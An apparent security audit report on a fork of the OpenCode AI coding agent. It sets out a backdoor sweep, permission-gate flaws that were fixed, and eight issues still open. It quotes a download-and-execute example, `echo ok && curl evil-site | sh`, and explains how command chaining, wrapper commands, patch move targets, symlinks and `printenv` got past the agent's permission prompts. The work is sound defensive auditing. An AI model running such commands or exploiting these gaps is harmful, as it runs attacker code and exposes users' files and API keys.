<!-- Version: 1.0.0 · updated 26-08-18-23-08 -->
# Security audit, 18 August 2026 — what was found, what was fixed, what was not

*Two tracks, both complete. Neither is a summary of the other. Every fix below is
committed; every unfixed item is listed rather than quietly dropped.*

---

## Plain-language track

### Why this happened at all

This program is a **fork** — a copy of an earlier project called OpenCode, taken
in a different direction. Forking gives you a working program on day one. It also
gives you every mistake the original made, silently, and you inherit them without
ever deciding to.

While chasing an unrelated bug, one of those mistakes surfaced. That prompted a
full audit: seven independent passes over the code, each looking for a different
class of problem, and then a second round whose only job was to attack the
findings and throw out the ones that didn't hold up.

### The first question: is there a backdoor?

**No.** Not "we didn't find one" — the audit went looking properly and can show
its work:

- The list of outside code this program depends on is **identical to the
  original's**. Nothing was added, nothing swapped for a lookalike.
- Every web address written into the code was found and classified — 738 of them.
  Only 80 end up in the shipped program, and all of them are either an AI service
  you chose, or a documentation link.
- The two pieces of code that every single request passes through were read line
  by line. Nothing is copied anywhere else.
- Checks for hidden text, disguised web addresses, invisible characters used to
  make code read differently than it runs, code that runs at startup, and build
  steps that could smuggle something in — all clean.
- No tracking, no analytics, no phoning home.

What was inherited isn't malice. It's an **unfinished permission system**,
written quickly in early 2025 and never revisited.

### What was actually wrong

Everything below shares one shape: **the program asked your permission for one
thing and then did another.** Not a missing lock — a lock fitted to the wrong
door.

**1. The command check read only the first word.** The program decides whether to
ask you before running a command by looking at how the command *starts*. But the
computer runs the whole line. So `echo ok && curl evil-site | sh` looked like the
harmless `echo`, was never questioned, and then downloaded and ran a stranger's
script. It also defeated this project's own deliberate ban on internet-fetching
commands.

**2. The "harmless commands" list wasn't harmless.** It contained commands whose
entire job is to run *another* command (`timeout`, `nohup`, `env`), so naming
them safe effectively named everything safe. It also contained commands that stop
programs and delete things.

**3. A patch could move a file anywhere on your disk.** Patches can say "move
this file to there". The destination was never checked and **never shown to
you**. A patch could ask "Update README.md?" and, when you agreed, write its
content into your shell startup file and delete the README. This was the worst
one found.

**4. The environment could be dumped without asking.** The command shell inherits
every password and API key the program holds. One command printed all of them
straight into the conversation — and therefore into the saved history and to the
AI provider. *(This one was a hole left in the first attempt at fix #1: one
spelling of the capability was removed and a synonym was left behind. The audit
caught it an hour later.)*

### What was fixed

- The command check now reads the **whole line**, splitting it wherever the shell
  would start a new command, and every piece must be recognised as harmless.
  Anything that can hide a command inside another, or write to a file, always
  asks.
- The dishonest entries were removed from the harmless list, each removal with
  its reason written next to it.
- A patch can no longer move a file out of your project, **and the destination is
  now named in the question you're asked**.
- The commands that can print your keys now always ask.

### It can still do its job

A security fix that breaks the tool is a worse bug than the one it fixed. This is
a **coding assistant** — it has to be able to write files, edit them, apply
patches and run builds. That was tested for real, not assumed:

| what it was asked to do | result |
|---|---|
| Create a new source file | worked |
| Edit an existing file | worked — and the result compiled and ran |
| Apply a patch adding a function | worked |
| Move a file into a subfolder | worked |
| Run a build | worked |
| Search the project for a symbol | worked |

**Being asked is not being blocked.** Everything you could do before, you can
still do. Some commands now show a prompt first — one keypress for you, and the
whole attack for an attacker.

### What was NOT fixed, stated plainly

Eight confirmed problems remain open. The five that would matter to you are
listed here; the developer track has the full table with exact locations:

- **Writing through a shortcut can still leave your project.** A shortcut file
  planted in the project can point outside it, and the question you're asked
  names the shortcut, not where it really goes.
- **"Allow for this session" grants far more than it says.** Approve one command
  and every later command of that type is approved silently.
- **The no-menus mode never shows you the change.** File rewrites are approved
  without you seeing what changes.
- **A failed tool reports success.** If something goes wrong, the assistant is
  handed an empty result marked "fine" — so it carries on believing the work was
  done.
- **Reading is not gated.** The assistant can read any file on the machine
  without asking.

---

## Developer track

### Method

Seven parallel hunt lanes (shell execution, permission model, file tools,
credential handling, network/SSRF, deliberate-backdoor sweep, prompt-injection
surface), each required to establish provenance per finding via `git log -S` /
`git blame`. Every claim then went to an independent adversarial verifier whose
default was **reject**, instructed to read the code and disprove.

**52 claims → 19 confirmed, 33 rejected.** Several severities were corrected
downward. One "finding" was a re-derivation of a caveat already written in
`docs/SHELL-SAFETY.md` earlier the same day.

### Backdoor sweep: negative, with evidence

| check | result |
|---|---|
| `go.mod` vs upstream `be5db3a` | **zero modules added or removed** |
| URL literals | 738 inventoried, 80 in the binary, all classified |
| Exfiltration | both custom `RoundTripper`s read line by line — none |
| Obfuscation | 3 base64 decodes in non-test code, all JWT/Gemini parses |
| Trojan source | bidi + zero-width scan clean (one U+200B in a generated comment) |
| `init()` functions | all 26 reviewed — themes, settings rows, cobra flags |
| `//go:embed` | 13 directives, all verified |
| Build hooks | `.goreleaser.yml` hooks list empty; no `//go:generate` |
| Telemetry | none |

Also noted: `fetch.go`'s SSRF guard is sound — `blockedIP` rejects loopback,
link-local (including `169.254.169.254`), RFC1918, unspecified and multicast.

### Fixed and committed

| commit | defect | provenance |
|---|---|---|
| `5ec68f9` | ban list matched `strings.Fields(cmd)[0]`; safe list matched a prefix; `shell.go:194` evals the whole line | UPSTREAM `904061c` (2025-03-25), `9492394` (2025-04-08), Kujtim Hoxha |
| `d22f075` | `*** Move to:` wrote to an unvalidated, unshown destination and deleted the source | UPSTREAM |
| `0ca0070` | `printenv`/`ps`/`top` on the no-prompt path while the shell inherits every API key | own regression from `5ec68f9` |
| `b480d12` | regression guard: legitimate in-workspace moves | — |

**`internal/llm/tools/commandgate.go`** — `splitShellCommands` splits on `&&`,
`||`, `;`, `|`, `&`, newlines; `hasOpaqueConstruct` disqualifies `$(`, backtick,
`${`, `>`, `<(` outright rather than parsing them; `BannedCommandIn` checks every
segment path-stripped; `IsSafeReadOnly` is conjunctive over all segments.

**`internal/llm/tools/workspace.go`** — `ensureInsideWorkspace` resolves symlinks
before comparing (a prefix test is defeated by a link inside the workspace) and
resolves the nearest existing ancestor for not-yet-existing destinations. Fails
closed.

Safe-list removals, each justified inline: wrappers (`nohup`, `nice`, `time`,
`timeout`, `env`), session mutators (`set`, `unset`), destructive (`kill`,
`killall`, `go clean`), executors (`go run`, `go install`), credential exposure
(`printenv`, `ps`, `top`).

**Declared residual risk:** `go build` and `go test` remain unprompted. Both
execute code from the tree. Kept because an agent runs them constantly; the
mitigating argument is that introducing that code requires the write tool, which
prompts.

### Capability regression testing

Non-negotiable for a coding agent. Verified end to end against a real project
with the fixes active, model `deepseek-v4-flash-0731`:

write → edit (compiled and ran) → patch → patch move-to-subdirectory → bash build
→ find. All six succeeded. `TestLegitimateInWorkspaceMovesStillWork` pins the
move cases (subdirectory, rename, dot-relative, deep non-existent parents,
absolute-but-inside) as a permanent guard.

### Confirmed and NOT fixed

| severity | defect | location |
|---|---|---|
| high | `write`/`edit` follow symlinks out of the workspace; prompt shows the link | `write.go:181`, `edit.go:324,440` |
| medium | session grant matches ToolName+Action+SessionID+Path, never `Params` | `permission.go:186` |
| medium | plain mode shows neither diff nor tool params | `plain.go` |
| medium | non-permission tool errors discarded; model gets empty result as success | `agent.go:564` |
| medium | `view`/`find` read any absolute path, no permission gate | `view.go:110`, `find.go:353` |
| medium | permission dialog default-ALLOW, selection not reset between prompts | `dialog/permission.go:514` |
| medium | TOCTOU: staleness check and diff computed before the prompt | `write.go:126` |
| low | denied write still creates the parent directory tree | `write.go:139-142` |

`ensureInsideWorkspace` already exists and is the natural fix for the first row;
it is simply not yet wired into `write.go` and `edit.go`.

### Methodology note

In this environment `grep` is a shell function wrapping `ugrep --ignore-files`,
so recursive greps **silently honour `.gitignore`**. A search can return empty
and look conclusive. Use `git grep`, or invoke the binary directly, when absence
is the finding.

### Claim Sources

| Claim | Basis | Evidence |
|---|---|---|
| Five commands executed with no permission prompt | 📄 stated in input | Upstream predicate extracted verbatim to a standalone program, run 2026-08-18. |
| `MovePath` never validated anywhere | 📄 stated in input | `grep -rn MovePath --include=*.go internal/` returns parser, plumbing, write only. |
| The shell inherits the full environment | 📄 stated in input | `shell.go:124`, `cmd.Env = append(os.Environ(), …)`. |
| `go.mod` unchanged vs upstream | 📄 stated in input | Diffed against `be5db3a`; zero modules added or removed. |
| 52 claims, 19 confirmed | 📄 stated in input | Audit run output, 31 agents. |
| Provenance of each fixed defect | 📄 stated in input | `git log -S` then `git log -1` on the introducing commit. |
| All six coding capabilities still work | 📄 stated in input | Live runs against a real project, artefacts inspected on disk. |
| There is no backdoor | 🤖 model inference | A negative from a bounded search. The individual checks are measurements; "therefore nothing malicious exists" is a conclusion drawn from them, and no audit can prove absence. |
| Severity ratings | 🤖 model inference | Judgement, corrected downward in several cases by the verifier. |
| Keeping `go build`/`go test` unprompted is acceptable | 🤖 model inference | A usability-versus-risk trade-off, stated so it can be disagreed with. |

`📄 stated in input` — produced by a named command, or present in quoted source.
`🤖 model inference` — the model's own judgement. Treat as reasoned opinion.
